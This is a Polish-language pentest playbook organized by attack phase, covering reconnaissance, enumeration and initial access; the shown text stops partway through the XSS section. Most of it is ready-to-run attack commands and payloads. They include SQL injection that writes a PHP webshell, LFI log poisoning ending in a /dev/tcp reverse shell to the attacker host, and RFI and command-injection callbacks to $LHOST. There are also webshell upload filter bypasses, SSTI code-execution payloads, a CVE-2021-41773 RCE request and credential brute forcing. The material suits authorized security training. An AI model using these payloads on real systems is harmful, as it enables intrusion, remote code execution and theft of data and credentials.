# 🗡️ Pentest Playbook — Kill Chain Edition

> Osobista ściąga uporządkowana wg **faz ataku** (cyber kill chain), a nie wg narzędzi.
> Kiedy jesteś na danym etapie zaczepienia — wchodzisz do odpowiedniego rozdziału i masz wszystko pod ręką.
>
> Oryginalny, „płaski” plik trzymam jako backup w **`Commands.md`**.

---

## 📑 Spis treści / Nawigacja

| # | Faza | Co tu znajdziesz |
|---|------|------------------|
| [0](#0-setup--zmienne-robocze) | **Setup** | Zmienne robocze, konwencje |
| [1](#1-recon--enumeration-rozpoznanie) | **Recon & Enumeration** | Nmap, web, DNS, SMB, SNMP, LDAP, RPC, AD user enum, hydra, vuln scan (NSE/Nessus) |
| [2](#2-initial-access--exploitation-uzyskanie-dostepu) | **Initial Access / Exploitation** | SQLi, LFI/RFI, upload, cmd injection, SSTI, XSS, SQLMap, API, reverse shells, TTY, exploity, Metasploit, client-side |
| [3](#3-post-exploitation--situational-awareness) | **Situational Awareness** | Rozpoznanie lokalne Linux / Windows |
| [4](#4-privilege-escalation-eskalacja-uprawnien) | **Privilege Escalation** | Linux (SUID/sudo/cron/caps) i Windows (services/DLL/registry) |
| [5](#5-credential-access-pozyskiwanie-poswiadczen) | **Credential Access** | John, hashcat, *2john, spraying, mimikatz, Kerberos, Responder, NTLM relay |
| [6](#6-active-directory) | **Active Directory** | BloodHound, PowerView, net/wmic, MSSQL |
| [7](#7-lateral-movement-ruch-boczny) | **Lateral Movement** | PsExec/WinRM/sc/WMI, PtH/PtT/PtK, RDP hijack |
| [8](#8-pivoting--port-forwarding) | **Pivoting** | SSH tunnels, socat, chisel, proxychains, DPI/DNS tunneling (dnscat2) |
| [9](#9-exfiltration--file-transfer) | **Exfiltration & Transfer** | Przerzucanie plików w obie strony |
| [10](#10-persistence--backdooring) | **Persistence** | Backdoory, scheduled tasks |
| [11](#11-blue-team--forensics) | **Blue Team / Forensics** | Detekcja, ausearch, analiza plików Windows |
| [12](#12-toolbox--reference) | **Toolbox** | grep, awk, find, xxd, git i inne narzędzia bazowe |
| [13](#13-cloud--aws-enumeracja-i-atak) | **Cloud (AWS)** | S3, IAM, EC2, Lambda — enumeracja i eskalacja w chmurze |
| [14](#14-reporting--technical-report) | **Reporting** | Notatki, struktura raportu, PoC, remediation, walkthrough |
| [A](#appendix-a--skroty-klawiszowe-shell) | **Appendix A** | Skróty klawiszowe shella |
| [B](#appendix-b--oscp-exam-playbook--metodyka) | **Appendix B** | OSCP exam playbook — metodyka, checklisty, pułapki |

---

## 0. Setup / Zmienne robocze

> Ustaw zmienne na początku sesji — wtedy komendy niżej kopiujesz 1:1 bez podmieniania IP.

```bash
export IP=10.10.10.10          # cel
export LHOST=10.14.0.1         # twój tun0 (sprawdź: ip a show tun0)
export LPORT=4444
export DOMAIN=tryhackme.loc
export DC=10.211.11.10         # domain controller
```

**Legenda placeholderów używanych niżej:** `TARGET_IP` = cel, `ATTACKER_IP`/`LHOST` = twoja maszyna, `DC` = kontroler domeny.

**Szybki start rozpoznania (odpal i idź parzyć kawę):**
```bash
sudo nmap --privileged -p- -sV -sC -T4 -v -oN nmap_full.txt $IP
```

---

# 1. Recon & Enumeration (Rozpoznanie)

> Cel fazy: zmapować powierzchnię ataku — otwarte porty, usługi, wersje, domeny, share'y, użytkownicy.
> **Zasada:** enumerate → enumerate → enumerate. 90% pracy to rozpoznanie.

> 🎯 **Drogowskaz — co po kolei:** 1) szybki ping-sweep (§1.1) → lista żywych hostów. 2) nmap `-sС -sV` na każdym (§1.2) → usługi+wersje. 3) każdy port ma swój tor: 80/443→web (§1.3), 445→SMB (§1.5), 389→LDAP (§1.7), 88→Kerberos/AD (§1.8), 161→SNMP (§1.6). 4) pełny `-p-` w tle, gdy grzebiesz w tym co znalazłeś.
> 💎 **Co wartościowe:** wersje usług (→ searchsploit) · anonymous/guest na SMB/FTP · `description` w LDAP · listę userów (→ spraying/AS-REP) · transfer strefy DNS · nietypowe wysokie porty.

## 1.1 Host discovery (co żyje w sieci?)

Sweep po zakresie IP (reverse DNS):
```bash
for ip in $(seq 64 79); do host 167.114.21.$ip; done | grep -Ev "not found|timed out"
```

Ping sweep / szybkie wykrycie żywych hostów (bez skanu portów):
```bash
nmap -sn 10.10.10.0/24 -oN live_hosts.txt          # -sn = ping scan, no ports
fping -a -g 10.10.10.0/24 2>/dev/null              # szybsza alternatywa
```

## 1.2 Port scanning — Nmap

Pełny, dokładny skan (mój domyślny):
```bash
nmap --privileged -p- -sV -sC -T4 -v -oN nmap_pelen_skan.txt $IP
# -p-  wszystkie 65535 portów | -sV wersje | -sC skrypty default | -T4 szybko | -oN zapis
```

**Trik dwuetapowy (szybko → głęboko)** — najpierw znajdź otwarte porty, potem skanuj tylko je:
```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep '^[0-9]' | cut -d/ -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sV -sC -A -oN nmap_deep.txt $IP
```

UDP (wolne — celuj w konkretne porty; SNMP/DNS/TFTP/IKE):
```bash
sudo nmap -sU --top-ports 20 -oN nmap_udp.txt $IP
```

**Wybór typu skanu:** `-sS` (SYN/half-open, domyślny gdy root — szybki, cichy) · `-sT` (connect, bez roota/przez proxy — wolniejszy, wpada w logi apki) · `-Pn` (host blokuje ICMP → traktuj jako up) · `-O --osscan-guess` (fingerprint OS ze stacku TCP/IP).

**Sweep całej podsieci (greppable `-oG` → potok):**
```bash
nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt && grep Up ping-sweep.txt | cut -d" " -f2   # lista żywych
nmap -p80,443 192.168.50.1-253 -oG web-sweep.txt && grep open web-sweep.txt | cut -d" " -f2  # kto ma web
```
**Netcat fallback (gdy brak nmapa na hoście):**
```bash
nc -nvv -w 1 -z $IP 3388-3390          # TCP: 'open' vs 'refused' (RST); -z zero-I/O, -w1 timeout
nc -nv -u -z -w 1 $IP 120-123          # UDP: brak odpowiedzi=open, ICMP unreachable=closed
```

Kategorie skryptów NSE (świetne do enumeracji):
```bash
nmap -p445 --script smb-enum-shares $IP           # które share dają RW
nmap -v -p 139,445 --script smb $IP               # cała rodzina skryptów SMB
nmap -p445 --script "vuln" $IP                     # znane podatności
ls /usr/share/nmap/scripts/ | grep smb             # przegląd dostępnych skryptów
```

## 1.3 Web enumeration

> 🎯 **Drogowskaz — web app (co po kolei):** 1) `nmap -p80 -sV --script=http-enum` → baner + apki/foldery/listing. 2) `whatweb`/Wappalyzer + **DevTools** → stack, wersje bibliotek JS (→ CVE), ukryte inputy, komentarze. 3) dopisz host do `/etc/hosts` (linki/redirecty po nazwie). 4) gobuster/ffuf — czytaj kody: **200** jest · **301/302** katalog · **403** jest+zabronione · **405** endpoint istnieje, zła metoda (→ verb tampering). 5) odpal **Burp** (proxy 127.0.0.1:8080). 6) `/robots.txt`, `/sitemap.xml`, view-source, nagłówki. 7) każdy input testuj: SQLi/LFI/upload/cmdi/XSS.
> 💎 **Co wartościowe:** wersje bibliotek JS (searchsploit) · directory listing ON · ukryte pola/komentarze · baner dev-server (Werkzeug/Python → exploit) · katalogi admin/backup.

```bash
sudo nmap -p80 --script=http-enum $IP                  # /login.php, znane apki (WordPress/BlogWorx), foldery admin, listing
echo "$IP target.thm" | sudo tee -a /etc/hosts         # apki osadzają hostname w linkach/redirectach — bez wpisu "connection refused"
```
> **DevTools (Firefox):** Debugger → *Pretty print* de-minifikuje JS (frameworki, wersje → CVE); Inspector → ukryte `input hidden`; Console (Ctrl+Shift+K) → testuj JS.

### Gobuster
```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 40 -x php,txt,bak,tar.gz,zip,html -o gobuster.txt -b 404,400
# -x rozszerzenia | -b blacklist kodów statusu | -t wątki
```
Vhosty (wirtualne hosty na tym samym IP):
```bash
gobuster vhost -u http://$IP -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -o vhosts.txt
```

### ffuf — szybszy i elastyczniejszy (warto znać obok gobustera)
```bash
# Katalogi
ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 60
# Vhost fuzzing (filtruj po rozmiarze odpowiedzi -fs, żeby uciąć śmieci)
ffuf -u http://$IP -H "Host: FUZZ.$DOMAIN" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 4242
# Parametry GET
ffuf -u "http://$IP/page?FUZZ=1" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
```

> 💡 **Zawsze** sprawdź źródło strony, `/robots.txt`, `/sitemap.xml`, nagłówki (`curl -I`), technologie (`whatweb $IP`), oraz komentarze w HTML. `nikto -h http://$IP` na szybki przegląd.

## 1.4 DNS

```bash
dnsenum $DOMAIN
dnsrecon -d $DOMAIN -t std                          # standard
dnsrecon -d $DOMAIN -D ~/wordlist.txt -t brt        # brute subdomen
# Strefowy transfer (jackpot, jeśli zadziała):
dig axfr @$IP $DOMAIN
# Lekko/ręcznie:
host -t mx $DOMAIN; host -t txt $DOMAIN              # MX (niższy numer=wyższy priorytet), TXT (tokeny/hinty)
for n in $(cat list.txt); do host $n.$DOMAIN; done | grep -v "not found"   # forward brute
gobuster dns -d $DOMAIN -w wordlist.txt -t 10        # (gobuster >3.6: --do zamiast -d)
```
> Forward-brute daje rozrzucone IP w tym zakresie → potem reverse-PTR sweep tego /24 = kolejne nazwane hosty (rekon jest **cykliczny**).

## 1.4b Pasywny OSINT (zanim dotkniesz celu)
> ⚠️ Na egzaminie OSCP faza pasywna prawie się nie liczy (brak internetowego OSINT) — na realnym teście jednak seeduje userów/maile i netbloki.
```bash
whois $DOMAIN -h <whois_ip>            # Registrant/Admin: name+org+phone+email + Name Servery
whois $IP -h <whois_ip>                # reverse → ISP/CIDR (kolejne cele skanów)
```
> **Google dorks:** `site:cel.com filetype:txt` · `intitle:"index of"` · `site:cel.com inurl:admin` · `site:cel.com "username" "password"` · `site:cel.com -www` (subdomeny). **Third-party (niski footprint):** Netcraft/Wappalyzer (stack), Shodan (`hostname:cel.com` → banner+CVE), securityheaders.com, ssllabs.com. **Sekrety w repo:** `gitleaks detect --source <repo>`, `gitrob <org>` (regex+entropia; zwykle potrzeba PAT).

## 1.4c Windows LOLBAS recon (assumed breach — bez Kali, bez internetu)
> Na zablokowanym hoście AD robisz DNS + skan portów **wbudowanym Windowsem**. Kluczowe egzaminacyjnie.
```powershell
nslookup mail.corp.com                                 # A; -type=TXT/MX <host> <dns-server>
Test-NetConnection -Port 445 192.168.50.151            # TcpTestSucceeded:True = open (ICMP+1 port)
1..1024 | % { echo ((New-Object Net.Sockets.TcpClient).Connect("10.10.10.5",$_)) "port $_ open" } 2>$null   # lekki skan portów
```
```cmd
net view \\dc01 /all                                   :: share'y (ADMIN$/C$/IPC$) + komentarze
```

## 1.5 SMB / NetBIOS (porty 139, 445)

> Port **139** = NetBIOS (stare, komunikacja w LAN); port **445** = SMB.

```bash
sudo nbtscan -r 10.10.10.0/24                       # -r skanuje NetBIOS 137
```
Listowanie i anonimowe logowanie:
```bash
smbclient -L //$IP -N                               # -N = null session (bez hasła)
smbclient //$IP/SHARE_NAME -N                       # podłącz się do konkretnego share
smbmap -H $IP                                        # pokazuje uprawnienia R/W per share
smbmap -H $IP -u guest                               # spróbuj z kontem guest
```
enum4linux-ng (users, groups, shares, policy, RID cycling):
```bash
enum4linux-ng -A $IP -oA results/scan
# -A = wszystkie funkcje | -oA = zapis do YAML + JSON
```
CrackMapExec — szwajcarski scyzoryk SMB/LDAP/WinRM:
```bash
crackmapexec smb $IP --pass-pol                      # polityka haseł (bez creds jeśli anon)
crackmapexec smb $IP -u users.txt -p passwords.txt   # password spray
crackmapexec smb $IP -u user -p pass --shares        # listuj share'y z poświadczeniami
crackmapexec smb $IP -u user -p pass --sam           # dump SAM (jeśli admin)
# Wskazówka: (Pwn3d!) w outputcie = masz admina na tym hoscie
```

### rpcclient (MSRPC przez SMB)
```bash
rpcclient -U "" $IP -N                                # -U "" pusty user, -N bez hasła (anon)
```
Wewnątrz konsoli: `enumdomusers`, `enumdomgroups`, `queryuser 0x1f4`, `queryuser <RID>`.
> RID **500** = Administrator, **501** = Guest, **512-514** = Domain Admins/Users/Guests. Konta użytkowników zwykle od **1000** w górę.

RID cycling (wyciągnij userów po RID-ach):
```bash
for i in $(seq 500 2000); do \
  user=$(echo "queryuser $i" | rpcclient -U "" -N $IP 2>/dev/null | grep -i "User Name"); \
  if [ -n "$user" ]; then echo "[RID: $i] $user"; fi; done
```
Wycinanie userów z outputu enumdomusers (`[nazwa]` → users.txt):
```bash
awk -F'[][]' '{print $2}' rpc_wynik.txt > users.txt
# -F'[][]' ustawia [ oraz ] jako separatory | print $2 = to co między pierwszym [ a ]
```

## 1.5b SMTP (port 25) — enum userów
```bash
nc -nv $IP 25                          # po połączeniu:
VRFY root                              # 252 = akceptowany/prawdopodobny · 550 = unknown (skryptuj po userliście)
# EXPN <lista> = członkowie listy mailingowej; Windows bez Kali: dism /online /Enable-Feature /FeatureName:TelnetClient → telnet $IP 25
```
> `252` nie potwierdza usera w 100% (serwer bywa „accept-and-attempt"), ale zawęża listę do sprayingu/phishingu.

## 1.6 SNMP (port 161/UDP)

> MIB Table zawiera kody OID. Community string domyślnie `public` (read).

```bash
snmpwalk -c public -v1 -t 10 $IP                      # cały MIB tree (-t 10 = timeout 10s)
snmpwalk -c public -v1 $IP 1.3.6.1.4.1.77.1.2.25       # konta użytkowników
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.4.2.1.2      # uruchomione procesy
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.6.3.1.2      # zainstalowane oprogramowanie
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.6.13.1.3        # otwarte porty TCP
# Zgadywanie community stringów:
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP
```

## 1.7 LDAP (port 389 / 636)

Test anonimowego bindu:
```bash
ldapsearch -x -H ldap://$IP -s base                   # -x prosta auth (anon), -s base tylko obiekt bazowy
```
Dump użytkowników z DC:
```bash
ldapsearch -x -H ldap://$IP -b "dc=tryhackme,dc=loc" "(objectClass=person)"
# Ciekawe: szukaj haseł w polu description
ldapsearch -x -H ldap://$IP -b "dc=tryhackme,dc=loc" "(objectClass=user)" description
```

## 1.8 AD user enumeration (bez poświadczeń)

### kerbrute — walidacja userów po Kerberos pre-auth (cichsze niż SMB brute)
```bash
kerbrute userenum --dc $DC -d $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```
> Najpierw enumeruj (enum4linux/rpc/ldap), zbuduj `users.txt`, a `kerbrute` potwierdzi które konta istnieją, są aktywne i nie są honeypotami.

### AS-REP Roasting (GetNPUsers) — konta bez wymaganego pre-auth
```bash
impacket-GetNPUsers $DOMAIN/ -dc-ip $DC -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
# Zbiera hashe AS-REP dla podatnych kont → łamiesz offline (hashcat -m 18200)
```

## 1.9 Online password attacks (hydra + budowanie list)

> Brute force **usług sieciowych** (nie hashy — to §5). Zawsze najpierw spróbuj defaultów i creds znalezionych w enumeracji.

### Hydra — najczęstsze protokoły
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://$IP
hydra -L users.txt -P pass.txt ftp://$IP
hydra -l admin -P rockyou.txt rdp://$IP
hydra -L users.txt -P pass.txt $IP smb                       # -t 1 (SMB nie lubi wielu wątków)
# HTTP POST form — F=marker błędu, ^USER^/^PASS^ podstawiane
hydra -l admin -P rockyou.txt $IP http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=Invalid credentials"
# HTTP Basic Auth
hydra -L users.txt -P pass.txt $IP http-get /admin/
```
> Alternatywy: `crackmapexec smb $IP -u users.txt -p pass.txt` (spray), `netexec`, `medusa`, `patator`.

### Budowanie celowanych wordlist
```bash
cewl -d 3 -m 5 -w wordlist.txt http://$IP                    # słowa ze strony celu
# Mutacje hasłami (dopisz cyfry/znaki) — hashcat rules:
hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt
# Generowanie loginów z imion i nazwisk:
./Scripts/username_generator/username_generator.py   # własny skrypt w repo
# username-anarchy (imię.nazwisko, inicjały itd.):
username-anarchy Jan Kowalski > users.txt
```
> 💡 Własne skrypty pomocnicze masz w `./Scripts/` (LFI scanner, RPC enum, session bruteforce, php_mt_seed, PadBuster do padding oracle).

## 1.10 Vulnerability scanning (skanery + NSE)

> Skanery automatyzują dopasowanie „wersja usługi → znane CVE”. Traktuj wynik jako **trop, nie dowód** — zawsze weryfikuj ręcznie (false-positive/negative). Na OSCP: automaty jako uzupełnienie enumeracji, nigdy zamiast niej.

### Nmap NSE — skrypty vuln
```bash
ls /usr/share/nmap/scripts | grep -i vuln           # co jest dostępne lokalnie
grep '"vuln"' /usr/share/nmap/scripts/script.db      # skrypty z kategorii vuln
sudo nmap -sV -p 443 --script "vuln" $IP             # cała kategoria vuln (głośne, intrusive)
sudo nmap -sV --script "http-vuln*" $IP              # wybrany zestaw po nazwie
sudo nmap -sV --script vulners $IP                   # vulners: wersja → CVE + linki do exploitów
```
### Dodanie własnego skryptu NSE (np. świeży CVE z GitHuba)
```bash
sudo cp http-vuln-cve2021-41773.nse /usr/share/nmap/scripts/
sudo nmap --script-updatedb                          # przebuduj bazę skryptów
sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" $IP
```
### Nessus (GUI, kompleksowy skaner)
```bash
sudo dpkg -i Nessus-*.deb        # instalacja z .deb (Kali)
sudo systemctl start nessusd     # start usługi
# konfiguracja: https://kali:8834/  → New Scan → Basic Network Scan → podaj zakres IP
```
> Inne skanery: **nikto** (web) `nikto -h http://$IP`, **wpscan** (WordPress) `wpscan --url http://$IP`, **nuclei** (szablony CVE) `nuclei -u http://$IP`.

---

# 2. Initial Access / Exploitation (Uzyskanie dostępu)

> Cel fazy: pierwszy shell / pierwsze poświadczenia. Web, słabe hasła, znane CVE.

## 2.1 Web attacks — SQL Injection

> 🎯 **Drogowskaz — SQLi → RCE:** 1) **fingerprint DBMS** (`@@version`/`version()` — styl komentarzy i RCE różnią się per silnik). 2) masz creds/otwarty port? wejdź natywnie (poniżej) i enumeruj obok SQLi. 3) potwierdź injekcję (sama `'` = błąd składni) → `OR 1=1`/UNION/blind. 4) enumeruj: user → privileged? → bazy → tabele (`information_schema`/`sys.databases`), celuj w **custom** DB. 5) dump hashy → crack. 6) RCE: MSSQL `xp_cmdshell` · MySQL `INTO OUTFILE`. 7) blind/za wolno → sqlmap (głośny, na exam do identyfikacji).

**Natywny klient (gdy masz creds / otwarty 3306/1433) — szybsze niż przez SQLi:**
```bash
mysql -u root -p'root' -h $IP -P 3306 --skip-ssl      # ERROR 2026 TLS → --skip-ssl; potem: select version(); system_user();
#   SELECT user,authentication_string FROM mysql.user;   -- hashe MySQL8 (Caching-SHA-256) do łamania
impacket-mssqlclient sa:Passw0rd@$IP -windows-auth     # MSSQL; SELECT name FROM sys.databases; select * FROM baza.dbo.users;
#   pomijaj master/tempdb/model/msdb; schemat dbo między bazą a tabelą; zdalnie OMIŃ końcowe GO
```

### Blind boolean-based (inference, gdy apka różnicuje output — szybsze niż time)
```
offsec'                                  -- sama apostrofa = błąd składni = injekcja potwierdzona
?user=offsec' AND 1=1 -- //              -- zwraca rekord (TRUE)
?user=offsec' AND 1=2 -- //              -- nic (FALSE) → wnioskuj bit po bicie
```

### Boolean-based (autoryzacja / logika)
```sql
offsec' OR 1=1 -- //
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

### UNION-based (wyciąganie danych)
```sql
-- 1. Ustal liczbę kolumn
' ORDER BY 1-- //          -- zwiększaj aż poleci błąd
-- 2. Potwierdź liczbę kolumn i pozycje wyświetlane
%' UNION SELECT 'a1','a2','a3','a4','a5' -- //
-- 3. Enumeracja bazy
' UNION SELECT null,null,database(),user(),@@version -- //
-- 4. Tabele i kolumny
' union select null,table_name,column_name,table_schema,null from information_schema.columns where table_schema=database() -- //
-- 5. WebShell na dysk (INTO OUTFILE)
' UNION SELECT "<?php system($_GET['cmd']);?>",null,null,null,null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
-- następnie: http://TARGET_IP/tmp/webshell.php?cmd=id
```

### Blind (time-based)
```sql
' AND IF (1=1, sleep(3),'false') -- //
```

### MSSQL — RCE przez xp_cmdshell
```bash
impacket-mssqlclient Administrator:Lab123@$IP -windows-auth   # 1. wejdź do bazy
```
```sql
EXECUTE sp_configure 'show advanced options',1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```

## 2.2 SQLMap (automatyzacja)

```bash
# Szybkie znalezienie punktu wstrzyknięcia (GET)
sqlmap -u "http://$IP/blindsqli.php?user=1" -p user
sqlmap -u "http://$IP/blindsqli.php?user=1" -p user --dump     # dump danych

# POST — podmień nazwy pól (submit, username, password wg formularza)
sqlmap -u "http://$IP/login.php" --data="pma_username=admin&pma_password=password&submit=Go" \
  --method POST --level 3 --risk 2 --batch --dbs

# Dla opornych serwerów (dodatkowe pola)
sqlmap -u "http://$IP/index.php" --data="pma_username=admin&pma_password=password&server=1&target=index.php" \
  --method POST --level 3 --risk 2 --batch --dbs

# Z zapisanego requestu Burpa (najwygodniejsze przy złożonych sesjach/nagłówkach)
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"   # os-shell = RCE
```

## 2.3 WAF bypass / encoding (notatki)

```
URL-encoding:      / => %2f
Hex-encoding:      _ => \x5f, 0x5f
Unicode-encoding:  % => %
Mixed-case, białe znaki i komentarze do omijania filtrów:
  '/**/UNION/**/SELECT/**/1,2
XSS przez encoding znaków:
  <img src=x onerror=&#97;lert(1)>                          (decimal 'a')
  <svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>            (hex 'alert')
  <body onload=&#97;&#108;&#101;&#114;&#116;(1)>           (full decimal)
  <a/href=j&#x0D;avascript:a&#x0D;lert(1)>aaa</a>
```
**Alternatywne metody HTTP** (WAF czasem nie filtruje wszystkich):
`HEAD` (tylko nagłówki), `OPTIONS` (dozwolone metody/CORS), `PUT`/`PATCH` (update REST),
`DELETE` (usuwanie), `TRACE` (echo requestu). Test: `curl -X OPTIONS -i http://$IP/`.

## 2.4 LFI / RFI (Local / Remote File Inclusion)

> Parametr ładujący pliki (`?page=`, `?file=`, `?lang=`) → czytanie plików lub RCE.

**Podstawowy odczyt + path traversal:**
```
http://$IP/index.php?page=/etc/passwd
http://$IP/index.php?page=../../../../../../etc/passwd
http://$IP/index.php?page=....//....//....//etc/passwd     # bypass filtra ../
http://$IP/index.php?page=/etc/passwd%00                    # null byte (stare PHP <5.3.4)
```
**Ciekawe pliki do wyciągnięcia (Linux):**
```
/etc/passwd  /etc/shadow  /etc/hosts  /proc/self/environ
/var/www/html/config.php  /home/USER/.ssh/id_rsa  /root/.bash_history
/var/log/apache2/access.log   /var/log/auth.log
```
**Windows** (testuj OBA slashe — niektóre apki podatne TYLKO na `..\`; brak listowania katalogów → znaj ścieżki):
```
http://$IP/index.php?page=..\..\..\..\Windows\System32\drivers\etc\hosts
http://$IP/index.php?page=../../../../../xampp/passwords.txt          # C:\xampp\passwords.txt, apache/logs/access.log
http://$IP/index.php?page=../../../../../inetpub/wwwroot/web.config   # IIS
```
**Znane CVE traversal (gotowce):**
```bash
curl --path-as-is http://$IP/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd   # Apache 2.4.49/50 (CVE-2021-41773); %2e omija filtr ../
curl --data 'echo;id' 'http://$IP/cgi-bin/%2e%2e/%2e%2e/%2e%2e/bin/sh'        # ↑ RCE gdy mod_cgi on
curl --path-as-is http://$IP:3000/public/plugins/alertlist/../../../../../../etc/passwd   # Grafana (CVE-2021-43798); loot grafana.ini
```
> `curl` sam normalizuje kropki → **`--path-as-is`** wysyła surową ścieżkę. Zwykłe `../` często zwraca 404 mimo podatności → ZAWSZE testuj kodowanie (`%2e`, `%2f`) zanim uznasz „niepodatne".

**Traversal → kradzież klucza SSH → logowanie** (najczęstszy foothold):
```bash
curl 'http://$IP/index.php?page=../../../../../../home/USER/.ssh/id_rsa' -o key   # user+home z /etc/passwd
chmod 400 key                                          # SSH odrzuca 0644 "too open"
ssh -i key -p 2222 USER@$IP                            # port często 2222, nie 22
```

**PHP wrappers (odczyt źródła i RCE):**
```
# Base64 kodowanie źródła PHP (żeby serwer nie wykonał, tylko pokazał)
php://filter/convert.base64-encode/resource=index.php
# RCE przez data:// (jeśli allow_url_include=On)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id
# RCE przez wykonanie payloadu z inputu
php://input   (POST body: <?php system($_GET['c']);?>)
# expect:// (jeśli rozszerzenie expect włączone)
expect://id
```
**Log poisoning → RCE** (wstrzyknij PHP do logu, potem załaduj log przez LFI):
```bash
# 1. Zatruj User-Agent (ten sam snippet działa cross-OS):
curl -A "<?php system(\$_GET['c']); ?>" http://$IP/
# 2. Załaduj log przez LFI + wykonaj (spacje URL-enkoduj jako %20!):
http://$IP/index.php?page=/var/log/apache2/access.log&c=id
#    Windows XAMPP: page=../../../../../xampp/apache/logs/access.log&c=dir
# 3. Reverse shell — system() woła /bin/sh (brak >&) → owiń w bash -c:
#    &c=bash%20-c%20"bash%20-i%20>%26%20/dev/tcp/$LHOST/$LPORT%200>%261"
```
> ⚠️ Log ma teraz 2 snippety → komenda wykona się **2×**. OPSEC: payload zostaje w logu na stałe → zanotuj do cleanup.
**RFI** (gdy `allow_url_include=On`) — serwuj payload u siebie i wskaż URL:
```
http://$IP/index.php?page=http://$LHOST:8000/shell.txt&c=id
```

## 2.5 File Upload bypass

> Cel: wgrać webshell/reverse shell mimo filtrów.
```php
# shell.php — minimalny webshell
<?php system($_GET['cmd']); ?>
```
**Techniki omijania filtrów rozszerzeń:**
```
shell.php  →  shell.phtml / .php3 / .php4 / .php5 / .php7 / .phar / .pht
shell.php.jpg           # double extension (gdy serwer bierze pierwsze)
shell.jpg.php           # gdy bierze ostatnie
shell.php%00.jpg        # null byte
shell.pHp               # mixed case
```
**Content-Type spoofing** (w Burpie zmień na `image/jpeg`) + **magic bytes** (dodaj `GIF89a;` na początku pliku, żeby przeszedł walidację obrazu):
```
GIF89a;
<?php system($_GET['cmd']); ?>
```
`.htaccess` upload (wymuś parsowanie .jpg jako PHP):
```
AddType application/x-httpd-php .jpg
```
> Uploady ASP/ASPX (IIS): `shell.aspx`, `shell.asp;.jpg`. Zawsze sprawdź gdzie ląduje plik (`/uploads/`).

**Upload NIE wykonuje się? → traversal w nazwie pliku → nadpisz `authorized_keys`** (app z własnym web serverem często biegnie jako root):
```bash
ssh-keygen -f fileup; cp fileup.pub authorized_keys
# w Burpie: filename="../../../../../../../root/.ssh/authorized_keys" → Forward (blind — response tylko odbija nazwę)
ssh -p 2222 -i fileup root@$IP                         # nadpisanie authorized_keys włącza SSH roota
```
> **Arsenał webshelli na Kali** (do upload/RFI): `/usr/share/webshells/{php,asp,aspx,jsp}` — np. `php/simple-backdoor.php` → `?cmd=whoami`. Delivery PowerShell przez webshell: `?cmd=powershell -enc <B64>` — pamiętaj **UTF-16LE** (`[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($t))`), nie UTF-8.

## 2.6 Command Injection

> Parametr trafiający do shella. Separatory łańcuchowe:
```bash
; id            # sekwencyjnie
| id            # pipe
|| id           # gdy pierwsza komenda faila
&& id           # gdy pierwsza sukces
` id `          # backticks
$(id)           # command substitution
%0a id          # newline (URL-encoded)
```
**Blind command injection (bez outputu)** — potwierdź OOB:
```bash
ping -c 4 $LHOST                 # nasłuchuj: sudo tcpdump -i tun0 icmp
curl http://$LHOST:8000/$(whoami)   # zobaczysz nazwę w logach http.server
sleep 5                          # time-based potwierdzenie
```

## 2.7 SSTI (Server-Side Template Injection)

> Wykryj: wstrzyknij `${7*7}`, `{{7*7}}`, `<%= 7*7 %>` — jeśli zwróci `49`, silnik szablonów wykonuje kod.

**Jinja2 / Python — RCE:**
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
> Rozbiór: `self` = obiekt szablonu → `__init__` → `__globals__` (słownik globali) → `__builtins__` (wbudowane funkcje) → `__import__('os')` → `popen('id').read()`.

**Bypass filtrów przez hex** — Python czyta `\x6f\x73` jako `os` (zamień stringi na hex, strukturę `self`/`()` zostaw):
```
'\x6f\x73'  ==  'os'      (o=6f, s=73)
```
**Inne silniki (szybka ściąga):**
```
Twig (PHP):   {{['id']|filter('system')}}
Freemarker:   <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
Ruby ERB:     <%= `id` %>
```
> 🔗 Metodyka i payloady per-silnik: PayloadsAllTheThings / tplmap.

## 2.8 XSS (cookie stealing + exfiltracja)

**Detekcja (najpierw):** wstrzyknij znaki `< > ' " { } ;` — jeśli wracają jako `&lt;`/`%3C` = kodowane (chronione); nieskodowane = XSS.
```html
<script>alert(42)</script>     <!-- unikatowa liczba potwierdza, że TWÓJ inject odpalił -->
```
> Kontekst decyduje: między tagami potrzebujesz `<script>`; wewnątrz istniejącego JS wystarczą `' " ;`. **Sinki:** search, błędy, komentarze/recenzje, oraz nagłówki **User-Agent / X-Forwarded-For** (stored, renderowane w panelu admina — np. WP Visitors plugin). Podmień nagłówek w Burp Repeater; `200 OK` = payload zapisany.

